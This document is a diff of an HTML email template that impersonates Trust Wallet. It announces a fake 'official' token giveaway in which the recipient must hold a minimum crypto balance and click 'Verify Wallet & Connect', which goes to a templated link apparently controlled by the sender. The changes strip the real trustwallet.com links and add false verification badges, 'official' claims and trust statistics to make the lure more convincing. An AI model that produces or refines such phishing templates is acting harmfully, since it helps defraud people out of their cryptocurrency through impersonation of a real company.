@@ -4,133 +4,416 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>TrustWallet Giveaway Notification</title>
+    <title>Trust Wallet - Official Portal</title>
     <style>
+        :root {
+            --primary: #3375BB;
+            --primary-dark: #2C64A9;
+            --primary-light: #EBF2FB;
+            --accent: #00B6B6;
+            --success: #02B464;
+            --warning: #FFB41D;
+            --surface: #FFFFFF;
+            --background: #F5F7FC;
+            --text-primary: #1D2B4D;
+            --text-secondary: #5E6C84;
+            --border: #E6EAF2;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: 'Helvetica', Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
+            background-color: var(--background);
+            line-height: 1.6;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 100%;
+            margin: 0;
+            padding: 40px 20px;
+            background: var(--background);
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: var(--surface);
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(51, 117, 187, 0.12);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #3375BB 0%, #2C64A9 100%);
+            padding: 40px 32px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M10 50C10 27.909 27.909 10 50 10C72.091 10 90 27.909 90 50C90 72.091 72.091 90 50 90C27.909 90 10 72.091 10 50Z' stroke='rgba(255,255,255,0.1)' stroke-width='1'/%3E%3C/svg%3E");
+            opacity: 0.15;
+        }
+
+        .brand-header {
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-container {
+            background: rgba(255, 255, 255, 0.1);
+            display: inline-flex;
+            padding: 16px 24px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+        }
+
+        .logo {
+            height: 36px;
+            width: auto;
+        }
+
+        .header-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+        }
+
+        .header-subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .content {
+            padding: 32px;
+        }
+
+        .verification-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--primary-light);
+            color: var(--primary);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .info-card {
+            background: var(--background);
+            padding: 10px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+        }
+
+        .info-label {
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .info-value {
+            color: var(--text-primary);
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .steps-container {
+            margin: 32px 0;
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            padding: 16px;
+            background: var(--background);
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+
+        .step-number {
+            background: var(--primary);
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .step-content h3 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: var(--text-primary);
+        }
+
+        .step-content p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin: 0;
+        }
+
+        .cta-button {
+            display: block;
+            background: var(--primary);
+            color: white;
+            text-decoration: none;
+            padding: 18px 32px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 16px;
+            margin: 32px 0;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-button:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+        }
+
+        .security-box {
+            background: #FFF9EB;
+            border: 1px solid #FFE5B2;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 24px 0;
+        }
+
+        .security-box-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: #B25E05;
+            font-weight: 600;
+        }
+
+        .security-list {
+            list-style: none;
             margin: 0;
             padding: 0;
         }
 
-        .email-container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: #ffffff;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        .security-list li {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #805018;
+            font-size: 14px;
+            margin-bottom: 8px;
         }
 
-        .header {
-            background-color: #3678E5;
-            padding: 20px;
+        .security-list li:last-child {
+            margin-bottom: 0;
+        }
+
+        .security-list li::before {
+            content: "•";
+            color: var(--warning);
+        }
+
+        .stats-banner {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            padding: 16px;
+            background: var(--primary-light);
+            border-radius: 12px;
+            margin: 24px 0;
+        }
+
+        .stat-item {
             text-align: center;
-            color: white;
         }
 
-        .header img {
-            width: 120px;
-            height: auto;
-        }
-
-        .header h1 {
-            font-size: 24px;
-            margin: 20px 0 0;
-            font-weight: 600;
-            letter-spacing: 1px;
-        }
-
-        .content {
-            padding: 30px;
-            line-height: 1.6;
-            color: #333;
-        }
-
-        .content h2 {
-            color: #3678E5;
+        .stat-value {
             font-size: 20px;
-            margin-bottom: 10px;
+            font-weight: 700;
+            color: var(--primary);
         }
 
-        .content p {
-            font-size: 16px;
-            margin: 10px 0;
-        }
-
-        .button {
-            display: block;
-            text-align: center;
-            margin-top: 30px;
-        }
-
-        .button a {
-            background-color: #3678E5;
-            color: white;
-            padding: 15px 30px;
-            text-decoration: none;
-            border-radius: 6px;
-            font-size: 18px;
-            font-weight: bold;
-        }
-
-        .button a:hover {
-            background-color: #275aa8;
+        .stat-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 4px;
         }
 
         .footer {
-            margin-top: 20px;
-            padding: 20px;
+            background: var(--background);
+            padding: 24px 32px;
             text-align: center;
-            font-size: 12px;
-            color: #777;
-            border-top: 1px solid #e5e5e5;
+            border-top: 1px solid var(--border);
         }
 
-        .footer a {
-            color: #3678E5;
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .footer-link {
+            color: var(--text-secondary);
             text-decoration: none;
+            font-size: 14px;
         }
 
-        .footer a:hover {
-            text-decoration: underline;
+        .footer-link:hover {
+            color: var(--primary);
+        }
+
+        .footer-text {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin: 4px 0;
+        }
+
+        @media (max-width: 600px) {
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-banner {
+                flex-direction: column;
+                gap: 16px;
+            }
+            
+            .header {
+                padding: 32px 24px;
+            }
+            
+            .content {
+                padding: 24px;
+            }
         }
     </style>
 </head>
 <body>
+    <div class="wrapper">
+        <div class="container">
+            <div class="header">
+                <div class="brand-header">
 
-    <div class="email-container">
-        <!-- Email Header -->
-        <div class="header">
-            <img src="https://trustwallet.com/assets/logo.svg" alt="TrustWallet Logo">
-            <h1>TrustWallet Giveaway</h1>
-        </div>
+                    <h1 class="header-title">Distribution Portal</h1>
+                    <p class="header-subtitle">Official Verification Required</p>
+                </div>
+            </div>
 
-        <!-- Email Content -->
-        <div class="content">
-            <h2>Congratulations, {{ recipient_email }}!</h2>
-            <p>
-                We are excited to announce that you have been selected to receive a <strong>TrustWallet Giveaway</strong> of 
-                <strong>{{ quantity }} {{ cryptocurrency.name }}</strong>.
-            </p>
-            <p>
-                To claim your giveaway, please make sure your wallet has a minimum balance of <strong>{{ min_balance }} {{ cryptocurrency.name }}</strong>.
-            </p>
-            <p>
-                Click the button below to connect your wallet and claim your giveaway:
-            </p>
+            <div class="content">
+                <div class="verification-tag">
+                    ✓ Verified Distribution Event
+                </div>
 
-            <div class="button">
-            <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" style="display: inline-block; padding: 10px 20px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">Claim Giveaway</a>
+                <p>Your wallet has been selected for the official Trust Wallet token distribution. Please review your eligibility details below.</p>
+
+                <div class="info-grid">
+                    <div class="info-card">
+                        <div class="info-label">Distribution Asset</div>
+                        <div class="info-value">{{ cryptocurrency.name }}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="info-label">Distribution Amount</div>
+                        <div class="info-value">{{ quantity }} {{ cryptocurrency.name }}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="info-label">Required Balance</div>
+                        <div class="info-value">{{ min_balance }} {{ cryptocurrency.name }}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="info-label">Status</div>
+                        <div class="info-value" style="color: var(--success)">Eligible</div>
+                    </div>
+                </div>
+
+                <div class="stats-banner">
+                    <div class="stat-item">
+                        <div class="stat-value">50M+</div>
+                        <div class="stat-label">Users Worldwide</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">4.8/5</div>
+                        <div class="stat-label">Trust Score</div>
+                    </div>
+
+                </div>
+
+                <div class="steps-container">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Connect Wallet</h3>
+                            <p>Securely connect your Trust Wallet to verify ownership</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Verify Balance</h3>
+                            <p>Confirm minimum balance requirement</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3>Receive Distribution</h3>
+                            <p>Tokens will be distributed to your verified wallet</p>
+                        </div>
+                    </div>
+                </div>
+
+                <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="cta-button">
+                    Verify Wallet & Connect
+                </a>
+
+                <p style="font-size: 14px; color: var(--text-secondary); text-align: center;">
+                    This is an official Trust Wallet distribution event. For support, please contact us through verified channels only.
+                </p>
+            </div>
+
+            <div class="footer">
+                
+                <p class="footer-text">&copy; {{ current_year }} Trust Wallet. All rights reserved.</p>
+                <p class="footer-text">Official Trust Wallet Distribution Program</p>
             </div>
         </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            <p>&copy; {{ current_year }} TrustWallet. All rights reserved.</p>
-            <p><a href="https://trustwallet.com">Visit TrustWallet</a> | <a href="mailto:support@trustwallet.com">Support</a></p>
-        </div>
     </div>
-
 </body>
 </html>
